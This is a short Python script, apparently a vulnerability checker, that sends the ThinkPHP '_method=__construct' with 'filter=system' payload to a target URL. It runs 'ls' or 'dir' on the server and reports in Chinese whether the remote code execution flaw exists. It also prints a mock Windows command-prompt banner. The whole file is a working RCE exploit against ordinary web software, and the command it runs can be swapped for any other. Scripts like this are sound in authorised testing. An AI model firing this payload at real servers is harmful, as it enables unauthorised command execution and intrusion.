#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()


flags = ["application", "index.php", "runtime"]
cmdlist = ["ls", "dir"]

def verify(url):
    try:
        burp0_url = url
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip"}
        for cmd in cmdlist:
            res = True
            burp0_data = {"get[]": cmd, "_method": "__construct", "method": "get", "filter": "system"}
            req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)        
            for flag in flags:
                if flag not in req.text[:500]:
                    res = False
            if res:
                return cmd, req.text[:100]
    except:
        pass
    return "", ""
    
if __name__=="__main__":
    target = sys.argv[1]
    cmd, info = verify(target)
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 thinkphp_method_rce_system.py",target)
    if cmd != "":
        print("[+]漏洞存在，执行 命令",cmd,"的结果：", info)
    else:
        print("[-]漏洞不存在")
